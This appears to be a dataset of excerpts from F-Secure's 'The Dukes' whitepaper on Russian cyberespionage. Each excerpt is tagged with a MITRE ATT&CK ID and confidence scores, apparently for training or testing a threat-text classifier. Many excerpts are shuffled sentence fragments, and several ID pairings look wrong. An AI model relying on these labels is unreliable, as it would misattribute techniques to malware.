We believe the purpose of this parallel use was to 'fieldtest' the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke. We however feel it is unlikely that the CosmicDuke operators targeting drug dealers and those targeting governments could be two entirely independent entities. While we believe CosmicDuke to be an entirely custom- written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal.","S0234","S","0.967147","0.032853","0.967147","0.934294","True","keep"
"Additionally, the apparent timezone of the timestamps in all of the GeminiDuke samples compiled during the winter is UTC+3, while for samples compiled during the summer, it is UTC+4. As is common for malware, the GeminiDuke infostealer uses a mutex to ensure that only one instance of itself is running at a time. GEMINIDUKE First known activity January 2009 Most recent known activity December 2012 Other names However, GeminiDuke samples compiled after MSK was altered still vary the timezone between UTC+3 in the winter and UTC+4 during the summer. N/A C&C communication methods HTTP (S) Known toolset components ??? Loader ??? Information stealer ??? Multiple persistence components The GeminiDuke toolset consists of a core information stealer, a loader and multiple persistencerelated components. The GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. This assertion of time zone is also supported by timestamps found in many GeminiDuke samples, which similarly suggest the group work in the Moscow Standard Time timezone, as further detailed in the section on the technical analysis of GeminiDuke (page 23). Unlike CosmicDuke and PinchDuke, GeminiDuke primarily collects information on the victim computer's configuration. Unlike HammerDuke however, the URLs for the images downloaded by GeminiDuke are hardcoded in its initial configuration, rather than retrieved from Twitter.","S0025","S","0.951944","0.048056","0.951944","0.903888","True","keep"
"Additionally, Kaspersky noted that based on the compilation timestamps, the authors of the Duke malware appear to primarily work from Monday to Friday between the times of 6am and 4pm UTC+0","S0050","S","0.852424","0.147576","0.852424","0.704848","True","keep"
"ATTRIBUTION AND STATE-SPONSORSHIP Attribution is always a difficult question, but attempting to answer it is important in understanding these types of threats and how to defend against them.","TA0030","T","0.894333","0.105667","0.894333","0.788666","True","keep"
"We are however only aware of one instance - the exploitation of CVE-2013-0640 to deploy MiniDuke - where we believe the exploited vulnerability was a zero-day at the time that the group acquired the exploit.","S0337","S","0.781077","0.218923","0.781077","0.562154","True","keep"
"Finally, it is worth noting that the Dukes are known to sometimes re-infect a victim of one of their malware tools with another one of their tools.","S0048","S","0.955636","0.044364","0.955636","0.911272","True","keep"
"The only instances which we are aware of where the Dukes did not use spear-phishing as the initial infection vector is with certain OnionDuke variants.","T0865","T","0.746787","0.253213","0.746787","0.493574","True","keep"
"The spear-phishing emails used by the Dukes may contain either specially-crafted malicious attachments or links to URLs hosting the malware.","T0865","T","0.721296","0.278704","0.721296","0.442592","True","keep"
"These spear-phishing emails range from ones purposely designed to look like spam messages used to spread common crimeware and addressed to large numbers of people, to highly targeted emails addressed to only a few recipients (or even just one person) and with content that is highly relevant for the intended recipient(s).","T0865","T","0.865515","0.134485","0.865515","0.73103","True","keep"
"INFECTION VECTORS The Dukes primarily use spear-phishing emails when attempting to infect victims with their malware. In some cases, the Dukes appear to have used previously compromised victims to send new spear-phishing emails to other targets. The group did change the contents of the spear-phishing emails they sent, but they didn't switch to a new email format; instead, they reverted to the same efaxthemed format that they had previously employed, even to the point of reusing the exact same decoy document that they had used in the CozyDuke campaign a year earlier (July 2014). The spear-phishing emails used by the Dukes may contain either specially-crafted malicious attachments or links to URLs hosting the malware. These spear-phishing emails range from ones purposely designed to look like spam messages used to spread common crimeware and addressed to large numbers of people, to highly targeted emails addressed to only a few recipients (or even just one person) and with content that is highly relevant for the intended recipient(s).","T0865","T","0.935755","0.064245","0.935755","0.87151","True","keep"
"While one variant will use a preconfigured C&C server over HTTP or HTTPS, the other variant will use a Microsoft OneDrive account to exchange commands and stolen data with its operators.","TA0101","T","0.978738","0.021262","0.978738","0.957476","True","keep"
"The CloudDuke downloader will download and execute additional malware from a preconfigured location.","T1430.001","T","0.903084","0.096916","0.903084","0.806168","True","keep"
"CLOUDDUKE First known activity June 2015 Most recent known activity Summer 2015 Other names MiniDionis, CloudLook C&C communication methods HTTP (S), Microsoft OneDrive Known toolset components ??? Downloader ??? Loader ??? Two backdoor variants CloudDuke is a malware toolset known to consist of, at least, a downloader, a loader and two backdoor variants. The CloudDuke downloader will download and execute additional malware from a preconfigured location. The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the first time that this toolset was deployed by the Dukes, other than possible small-scale testing.","S0334","S","0.868031","0.131969","0.868031","0.736062","True","keep"
"Further reading FireEye; HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group; published July 2015; https://www2.fireeye.com/rs/848-DID-242/ images/rpt-apt29-hammertoss.pdf * *APT29 is the name used by FireEye to identify the cyberespionagegroup we refer to as the Dukes.","S0674","S","0.825306","0.174694","0.825306","0.650612","True","keep"
"In contrast however, for OnionDuke and MiniDuke the linked image files contain embedded malware to be downloaded and executed, rather than instructions.","T1027.009","T","0.897749","0.102251","0.897749","0.795498","True","keep"
"This, together with HammerDuke's simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed the initial infection and stole any readily available information from them.","S0568","S","0.96578","0.03422","0.96578","0.93156","True","keep"
"HAMMERDUKE First known activity January 2015 Most recent known activity Summer 2015 Other names HAMMERTOSS, Netduke C&C communication methods HTTP (S), Twitter Known toolset components ??? Backdoor HammerDuke is a simple backdoor that is apparently designed for similar use cases as SeaDuke. HammerDuke SeaDuke OnionDuke CozyDuke CosmicDuke GeminiDuke PinchDuke MiniDuke ItaDuke Duqu 'duke' 'duke' The Dukes HammerDuke is however interesting because it is written in .NET, and even more so because of its occasional use of Twitter as a C&C communication channel. HammerDuke's use of Twitter and crafted image files is reminiscent of other Duke toolsets. If the account exists, HammerDuke will then search for tweets from that account with links to image files that contain embedded commands for the toolset to execute. Some HammerDuke variants only contain a hardcoded C&C server address from which they will retrieve commands, but other HammerDuke variants will first use a custom algorithm to generate a Twitter account name based on the current date. Specifically, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. This, together with HammerDuke's simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed the initial infection and stole any readily available information from them.","T1566.001","T","0.941683","0.058317","0.941683","0.883366","True","keep"
"HAMMERDUKE First known activity January 2015 Most recent known activity Summer 2015 Other names HAMMERTOSS, Netduke C&C communication methods HTTP (S), Twitter Known toolset components ??? Backdoor HammerDuke is a simple backdoor that is apparently designed for similar use cases as SeaDuke.","S0130","S","0.948801","0.051199","0.948801","0.897602","True","keep"
"Available: http://www.boost.org/users/ history/ version_1_54_0.html Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014; com/2015/07/unit-42-technical-analysis- seaduke/ Artturi Lehtio; F-Secure Weblog; Duke APT group's latest tools: cloud services and Linux support; published 22 July 2015; https://www.f- secure.com/weblog/archives/00002822.html","S0237","S","0.896992","0.103008","0.896992","0.793984","True","keep"
"Further reading Artturi Lehtio; F-Secure Weblog; Duke APT group's latest tools: cloud services and Linux support; published 22 July 2015; https://www.f-secure. com/2015/07/unit-42-technical-analysis- seaduke/ Artturi Lehtio; F-Secure Weblog; Duke APT group's latest tools: cloud services and Linux support; published 22 July 2015; https://www.f- secure.com/weblog/archives/00002822.html","S0665","S","0.868907","0.131093","0.868907","0.737814","True","keep"
"Like HammerDuke, SeaDuke appears to be used by the Dukes group primarily as a secondary backdoor left on CozyDuke victims after that toolset has completed the initial infection and stolen any readily available information from them.","S0649","S","0.953758","0.046242","0.953758","0.907516","True","keep"
"Like HammerDuke, SeaDuke appears to be used by the Dukes group primarily as a secondary backdoor left on CozyDuke victims after that toolset has completed the initial infection and stolen any readily available information from them. SEADUKE First known activity October 2014 Most recent known activity Spring 2015 Other names SeaDaddy, SeaDask C&C communication methods HTTP (S) Known toolset components ??? Backdoor SeaDuke is a simple backdoor that focuses on executing commands retrieved from its C&C server, such as uploading and downloading files, executing system commands and evaluating additional Python code.","S0142","S","0.961874","0.038126","0.961874","0.923748","True","keep"
"SEADUKE First known activity October 2014 Most recent known activity Spring 2015 Other names SeaDaddy, SeaDask C&C communication methods HTTP (S) Known toolset components ??? Backdoor SeaDuke is a simple backdoor that focuses on executing commands retrieved from its C&C server, such as uploading and downloading files, executing system commands and evaluating additional Python code.","S0130","S","0.96783","0.03217","0.96783","0.93566","True","keep"
"Further reading Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014; https:// www.f-secure.com/ weblog/archives/00002764.html","S0175","S","0.907808","0.092192","0.907808","0.815616","True","keep"
"Based on our investigations into OnionDuke, we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identified by the researchers was being used to wrap executables on-the-fly with OnionDuke (image 7, page 13). Both OnionDuke and MiniDuke also use date-based algorithms to generate Twitter account names and then searched for any tweets from those accounts that linked to image files. For most of the OnionDuke components we observed, the first versions that we are aware of were compiled during the summer of 2013, suggesting that this was a period of active development around this toolset. Further reading Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014; https:// www.f-secure.com/ weblog/archives/00002764.html Further, the functionality of the OnionDuke variant is derived from a number of modules. In contrast however, for OnionDuke and MiniDuke the linked image files contain embedded malware to be downloaded and executed, rather than instructions. In fact, we saw yet another Duke malware toolset, OnionDuke, appear first in 2013. Like CozyDuke, OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. ONIONDUKE First known activity February 2013 Most recent known activity Spring 2015 Other names N/A C&C communication methods HTTP (S), Twitter (backup) On the 14 th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke, the other Duke toolsets known at the time OnionDuke first caught our attention because it was being spread via a malicious Tor exit node. OnionDuke gets caught using a malicious Tor node On the 23 rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found. OnionDuke's development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets. Screenshot of a tweet intended for OnionDuke, with a link pointing to an image file that embeds an updated version of OnionDuke. The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets. The use of Twitter either to initially obtain the address of a C&C server (or as a backup if no hardcoded primary C&C server responds) is a feature also found in OnionDuke, CozyDuke, and HammerDuke. We have since been able to identify at least two separate OnionDuke botnets. What makes OnionDuke especially curious is an infection vector it began using during the summer of 2013.","S0226","S","0.951922","0.048078","0.951922","0.903844","True","keep"
"Again, if a victim downloaded a torrent containing a wrapped executable, they would get infected with OnionDuke.","T1137.003","T","0.870397","0.129603","0.870397","0.740794","True","keep"
"Based on our investigations into OnionDuke, we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identified by the researchers was being used to wrap executables on-the-fly with OnionDuke (image 7, page 13). OnionDuke first caught our attention because it was being spread via a malicious Tor exit node.","S0175","S","0.95222","0.04778","0.95222","0.90444","True","keep"
"com/documents/996508/ 1030745/CozyDuke Kurt Baumgartner, Costin Raiu; Securelist; The CozyDuke APT; 21 April 2015; https://securelist. com/blog/ research/69731/the-cozyduke-apt/","S0046","S","0.361073","0.638927","0.361073","-0.277854","True","keep"
"Available: https://www.f-secure.com/ documents/996508/ 1030745/CozyDuke Symantec Security Response; 'Forkmeiamfamous': Seaduke, latest weapon in the Duke armory; published 13 July 2015; [Online]. Based on these and other similar stylistic differences observed between CozyDuke and its older siblings, we speculate that while the older Duke families appear to be the work of someone with a background in malware writing (or at the least in hacking), CozyDuke's author or authors more likely came from a software development background. Based on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. CozyDuke and monkey videos While we now know that CozyDuke had been under development since at least the end of 2011, it was not until the early days of July 2014 that the first large-scale CozyDuke campaign that we are aware of took place. CozyDuke's modular platform approach is a clear break from the designs of the previous Duke toolsets. Even if the noisy initial CozyDuke campaign is noticed by the victim organization, or by someone else who then makes it publicly known, defenders will begin by first looking for indicators of compromise (IOCs) related to the CozyDuke toolset. Finally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware. In other cases, CozyDuke has been observed downloading and executing tools from other toolsets used by the Dukes such as OnionDuke, SeaDuke, and HammerDuke. Known CozyDuke modules include: Command execution module for executing arbitrary Windows Command Prompt commands Password stealer module NT LAN Manager (NTLM) hash stealer module System information gathering module Screenshot module In addition to modules, CozyDuke can also be instructed to download and execute other, independent executables. Like CozyDuke, OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. Some of the CozyDuke spear-phishing emails from early July posed as e-fax arrival notifications, a popular theme for spam emails, and used the same 'US letter fax test page' decoy document that was used a year later by CloudDuke. Their 2015 CozyDuke and CloudDuke campaigns take this to the extreme by apparently opting for speed and quantity over stealth and quality. These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. com/documents/996508/ 1030745/CozyDuke Kurt Baumgartner, Costin Raiu; Securelist; The CozyDuke APT; 21 April 2015; https://securelist. com/blog/ research/69731/the-cozyduke-apt/","S0665","S","0.940518","0.059482","0.940518","0.881036","True","keep"
"Known CozyDuke modules include: Command execution module for executing arbitrary Windows Command Prompt commands Password stealer module NT LAN Manager (NTLM) hash stealer module System information gathering module Screenshot module In addition to modules, CozyDuke can also be instructed to download and execute other, independent executables.","T0807","T","0.969358","0.030642","0.969358","0.938716","True","keep"
"These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. This information stealer is augmented by a variety of components that the toolset operators may selectively include with the main component to provide additional functionalities, such as multiple methods of establishing persistence, as well as modules that attempt to exploit privilege escalation vulnerabilities in order to execute CosmicDuke with higher privileges.","S0177","S","0.984686","0.015314","0.984686","0.969372","True","keep"
"com/wp-content/uploads/downloads/2013/04/ MiniDuke_Paper_Final.pdf CIRCL - Computer Incident Response Center Luxembourg; Analysis Report (TLP:WHITE) Analysis of a stage 3 Miniduke sample; published 30 May 2013; https://www.circl.lu/files/tr-14/ circl-analysisreport-miniduke-stage3-public.pdf ESET WeLiveSecurity blog; Miniduke still duking it out; published 20 May 2014; http://www. welivesecurity.","S0234","S","0.688725","0.311275","0.688725","0.37745","True","keep"
"Available: https://www.fireeye.com/blog/threat-research/2013/02/in-turn-its-pdf- time.html Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk; Kaspersky Lab; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; published 27 February 2013; Further reading Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk; Kaspersky Lab; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; published 27 February 2013; http://kasperskycontenthub.com/ wp-content/ uploads/sites/43/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.pdf CrySyS Blog; Miniduke; published 27 February 2013; http://blog.crysys.hu/2013/02/miniduke/ Marius Tivadar, B??r?? Bal??zs, Cristian Istrate; BitDefender; A Closer Look at MiniDuke; published April 2013; http://labs. bitdefender.","S0354","S","0.546019","0.453981","0.546019","0.092038","True","keep"
"All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language. As researchers continued discovering new toolsets that were created and used by the same group that had been operating MiniDuke, the new toolsets were also given 'Duke'-derived names, and thus the threat actor operating the toolsets started to be commonly referred to as 'the Dukes'. As we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. Available: http://blog.trendmicro.com/trendlabs-security- intelligence/pawnstorms-domestic-spying-campaign-revealed-ukraine-and-us-top-global-targets/ GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014; CosmicDuke's moment of fame and the scramble that ensued Following the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2 nd July 2014 MINIDUKE First known activity ??? Loader July 2010 ??? Backdoor May 2011 Most recent known activity ??? Loader: Spring 2015 ??? Backdoor: Summer 2014 Other names N/A C&C communication methods HTTP (S), Twitter Known toolset components ??? Downloader ??? Backdoor ??? Loader The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke 'stage 1', 'stage 2', and 'stage 3' components as per Kaspersky's original MiniDuke whitepaper. MiniDuke's rise from the ashes While MiniDuke activity decreased significantly during the rest of 2013 following the attention it garnered from researchers, the beginning of 2014 saw the toolset back in full force. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. On the 14 th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke, the other Duke toolsets known at the time Secondly, some of the MiniDuke components do not contain a hardcoded C&C server address, but instead obtain the address of a current C&C server via Twitter. The Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke. The first observed samples of the MiniDuke backdoor component are from May 2011. This method is not unique to HammerDuke, as MiniDuke, OnionDuke, and CozyDuke all support similar use of Twitter (image 9, page 18) to retrieve links to additional payloads or commands. We are however only aware of one instance - the exploitation of CVE-2013-0640 to deploy MiniDuke - where we believe the exploited vulnerability was a zero-day at the time that the group acquired the exploit. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke.","S0177","S","0.928862","0.071138","0.928862","0.857724","True","keep"
"MINIDUKE First known activity ??? Loader July 2010 ??? Backdoor May 2011 Most recent known activity ??? Loader: Spring 2015 ??? Backdoor: Summer 2014 Other names N/A C&C communication methods HTTP (S), Twitter Known toolset components ??? Downloader ??? Backdoor ??? Loader The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke 'stage 1', 'stage 2', and 'stage 3' components as per Kaspersky's original MiniDuke whitepaper. ONIONDUKE First known activity February 2013 Most recent known activity Spring 2015 Other names N/A C&C communication methods HTTP (S), Twitter (backup)","S0130","S","0.925688","0.074312","0.925688","0.851376","True","keep"
"Available: http://seclists.org/fulldisclosure/2010/Jan/341 Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; Further reading Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; https://www.fsecure.com/ documents/996508/1030745/cosmicduke_ whitepaper.pdf GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014; https://securelist. com/blog/ incidents/64107/miniduke-is-back-nemesis- gemina-and-the-botgen-studio/","S0356","S","0.372325","0.627675","0.372325","-0.25535","True","keep"
"However, many of these loader samples embed CosmicDuke variants that exploit the CVE-2010- 0232 privilege escalation vulnerability thus making it impossible for the compilation timestamps to be authentic.","S1168","S","0.921126","0.078874","0.921126","0.842252","True","keep"
"After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers.","S0050","S","0.573512","0.426488","0.573512","0.147024","True","keep"
"A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. In the case of CVE-2010-0232, the exploit appears to be based directly on the proof of concept code published by security researcher Tavis Ormandy when he disclosed the vulnerability [4] .","S1073","S","0.846698","0.153302","0.846698","0.693396","True","keep"
"Likewise, many of CosmicDuke's persistence components use techniques also used by components associated with GeminiDuke and CozyDuke. Specifically, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke.","T1630.003","T","0.955502","0.044498","0.955502","0.911004","True","keep"
"While we believe CosmicDuke to be an entirely custom- written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal.","S0018","S","0.964097","0.035903","0.964097","0.928194","True","keep"
"CosmicDuke's information stealing functionality includes: Keylogging Taking screenshots Stealing clipboard contents Stealing user files with file extensions that match a predefined list Exporting the users cryptographic certificates including private keys Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers CosmicDuke may use HTTP, HTTPS, FTP or WebDav to exfiltrate the collected data to a hardcoded C&C server.","S1116","S","0.978141","0.021859","0.978141","0.956282","True","keep"
"COSMICDUKE First known activity January 2010 Most recent known activity Summer 2015 Other names Tinybaron, BotgenStudios, NemesisGemina C&C communication methods HTTP (S), FTP, WebDav Known toolset components ??? Information stealer ??? Multiple loaders ??? Privilege escalation component ??? Multiple persistence components The CosmicDuke toolset is designed around a main information stealer component.","S0447","S","0.940432","0.059568","0.940432","0.880864","True","keep"
"Some of the observed GeminiDuke samples that used timestamps as mutex names were compiled while MSK still respected DST and for these samples, the timestamps perfectly align with MSK as it was defined at the time.","S0023","S","0.915089","0.084911","0.915089","0.830178","True","keep"
"The collected details include: Local user accounts Network settings Internet proxy settings Installed drivers Running processes Programs previously executed by users Programs and services configured to automatically run at startup Values of environment variables Files and folders present in any users home folder Files and folders present in any users My Documents Programs installed to the Program Files folder Recently accessed files, folders and programs","T1087.001","T","0.975897","0.024103","0.975897","0.951794","True","keep"
"N/A C&C communication methods HTTP (S) Known toolset components ??? Loader ??? Information stealer ??? Multiple persistence components The GeminiDuke toolset consists of a core information stealer, a loader and multiple persistencerelated components.","T1213.001","T","0.824031","0.175969","0.824031","0.648062","True","keep"
"Based on our technical analysis of the known PinchDuke samples from 2008 however, we believe PinchDuke to have been under development by the summer of 2008. Credentials targeted by PinchDuke include ones associated with the following software or services: The Bat! Importantly, PinchDuke trojan samples always contain a notable text string, which we believe is used as a campaign identifier by the Dukes group to distinguish between multiple attack campaigns that are run in parallel. In addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews. In fact, the oldest samples of the loader that we have found were used with PinchDuke. In fact, we now know that before being used with either, the 'MiniDuke loader' was used to load PinchDuke. PinchDuke will also search for files that have been created within a predefined timeframe and whose file extension is present in a predefined list. Right - Decoy document from a 2009 PinchDuke campaign targeting Poland, the Czech Republic and a US think tank. The PinchDuke information stealer gathers system configuration information, steals user credentials, and collects user files from the compromised host transferring these via HTTP(S) to a C&C server. The story of the Dukes, as it is currently known, begins with a malware toolset that we call PinchDuke. This belief is based on the observation that in all of the other PinchDuke samples we have analyzed, the date of the campaign identifier has been within a day of the compilation date. We believe PinchDuke's credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums. We believe that during the spring of 2010, the credential and file stealing capabilities of PinchDuke were slowly ported to CosmicDuke, effectively making PinchDuke obsolete. We believe the purpose of this parallel use was to 'fieldtest' the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke.","T1056","T","0.945527","0.054473","0.945527","0.891054","True","keep"
"Credentials targeted by PinchDuke include ones associated with the following software or services: The Bat!","T1552.001","T","0.809501","0.190499","0.809501","0.619002","True","keep"
"We believe PinchDuke's credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums.","S0007","S","0.97932","0.02068","0.97932","0.95864","True","keep"
"In the most extreme case, the Dukes continued with their July 2015 CloudDuke campaign even after their activity had been outed by multiple security vendors. What is most significant about the July 2015 CloudDuke campaign is the timeline.","S1042","S","0.87568","0.12432","0.87568","0.75136","True","keep"
"Sometimes, both malware have used the same C&C server, but in other cases, even the servers have been different. While the BastionSolution variant simply retrieves commands from a hard-coded C&C server controlled by the Dukes, the OneDriveSolution utilizes Microsoft's OneDrive cloud storage service for communicating with its masters, making it significantly harder for defenders to notice the traffic and block the communication channel.","TA0101","T","0.977189","0.022811","0.977189","0.954378","True","keep"
"The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the first time that this toolset was deployed by the Dukes, other than possible small-scale testing.","S0130","S","0.950892","0.049108","0.950892","0.901784","True","keep"
"In this way, the advanced HammerDuke variant attempts to hide its network traffic in more legitimate use of Twitter.","T1481.001","T","0.964319","0.035681","0.964319","0.928638","True","keep"
"The simpler one will connect to a hardcoded C&C server over HTTP or HTTPS to download commands to execute.","TA0101","T","0.974853","0.025147","0.974853","0.949706","True","keep"
"We believe the primary purpose of this tactic is an attempt at evading detection in the targeted network.","T1590.004","T","0.868991","0.131009","0.868991","0.737982","True","keep"
"take a look replies Sep 2015: The Dukes up the ante The end of January 2015 saw the start of the most high- volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke.","T1585.002","T","0.906659","0.093341","0.906659","0.813318","True","keep"
"HammerDuke SeaDuke OnionDuke CozyDuke CosmicDuke GeminiDuke PinchDuke MiniDuke ItaDuke Duqu 'duke' 'duke' The Dukes THE DUKES 7 YEARS OF RUSSIAN CYBERESPIONAGE F-Secure Whitepaper September 2015 take a look replies Sep 2015: The Dukes up the ante The end of January 2015 saw the start of the most high- volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke.","S0054","S","0.89355","0.10645","0.89355","0.7871","True","keep"
"The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets.","T0859","T","0.96822","0.03178","0.96822","0.93644","True","keep"
"One theory is that the botnets were a criminal side business for the Dukes group. We have since been able to identify at least two separate OnionDuke botnets.","S0183","S","0.971641","0.028359","0.971641","0.943282","True","keep"
"While one of these modules gathers system information and another attempts to steal the victim's usernames and passwords, as one would expect from a malware used for a targeted attack, the other two known OnionDuke modules are quite the opposite; one is designed for use in DoS attacks and the other for posting predetermined messages to the Russian VKontakte social media site.","S0183","S","0.96869","0.03131","0.96869","0.93738","True","keep"
"Executing the modified applications obtained this way would result in the victim being infected with unidentified malware.","T1027.005","T","0.914954","0.085046","0.914954","0.829908","True","keep"
"OnionDuke gets caught using a malicious Tor node On the 23 rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found.","S0428","S","0.968857","0.031143","0.968857","0.937714","True","keep"
"Some of the CozyDuke spear-phishing emails from early July posed as e-fax arrival notifications, a popular theme for spam emails, and used the same 'US letter fax test page' decoy document that was used a year later by CloudDuke.","T1071.003","T","0.591731","0.408269","0.591731","0.183462","True","keep"
"This campaign, like later CozyDuke campaigns, began with spear-phishing emails that tried to impersonate commonly seen spam emails.","T1585.002","T","0.582644","0.417356","0.582644","0.165288","True","keep"
"As will become evident in this report, this was not a one-off case but a recurring theme with the Dukes, in that they would rather continue with their operations as planned than retreat from operating under the spotlight. Based on samples of Duke malware from 2012, the Dukes do appear to have continued actively using and developing all of their tools. Based on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. Based on what we currently know about the targets chosen by the Dukes over the past 7 years, they appear to have consistently targeted entities that deal with foreign policy and security policy matters. But are the Dukes a team or a department inside a government agency? Campaign identifiers from 2009 also reveal that by that time, the Dukes were already actively interested in political matters related to the United States (US) and the North Atlantic Treaty Organization (NATO), as they ran campaigns targeting (among other organizations) a US-based foreign policy think tank, another set of campaigns related to a NATO exercise held in Europe, and a third set apparently targeting what was then known as the Georgian 'Information Centre on NATO'. Concurrently with the alterations to CosmicDuke, the Dukes were also hard at work modifying their trusted loader. Continuing expansion of the Dukes arsenal By 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. During the rest of 2014 and the spring of 2015, the Dukes continued making similar evasionfocused modifications to CosmicDuke, as well as experimenting with ways to obfuscate the loader. EXECUTIVE SUMMARY The Dukes are a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. Even though the Dukes appear to have targeted governments all over the world, we are unaware of them ever targeting the Russian government. Finally, it is worth noting that the Dukes are known to sometimes re-infect a victim of one of their malware tools with another one of their tools. Firstly, the Dukes may have been confident enough in their own abilities (and in the slowness of their opponents to react to new threats) that they did not care if their targets may already be on the lookout for anyone exploiting these vulnerabilities. For the victims deemed interesting enough, the Dukes would then deploy a different toolset. Further reading FireEye; HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group; published July 2015; https://www2.fireeye.com/rs/848-DID-242/ images/rpt-apt29-hammertoss.pdf * *APT29 is the name used by FireEye to identify the cyberespionagegroup we refer to as the Dukes. INFECTION VECTORS The Dukes primarily use spear-phishing emails when attempting to infect victims with their malware. If however by that time the Dukes are already operating within the victim's network, using an another toolset with different IOCs, then it is reasonable to assume that it will take much longer for the victim organization to notice the infiltration. If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering. In one of their more intriguing cases, the Dukes have appeared to also target entities involved in the trafficking of illegal drugs. In some cases, the Dukes appear to have used previously compromised victims to send new spear-phishing emails to other targets. In the most extreme case, the Dukes continued with their July 2015 CloudDuke campaign even after their activity had been outed by multiple security vendors. In this case, the Dukes first attempted to infect large numbers of potential targets with CozyDuke (and in a more obvious manner than previously seen). Instead, we feel the targeting of drug dealers was a new task for a subset of the Dukes group, possibly due to the drug trade's relevance to security policy issues. It is therefore important to note that, contrary to what might be assumed, we have actually observed a drop instead of an increase in Ukraine-related campaigns from the Dukes following the country's political crisis. John Kasai of Klagenfurt, Austria During 2011, the Dukes appear to have significantly expanded both their arsenal of malware toolsets and their C&C infrastructure. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them. Right - 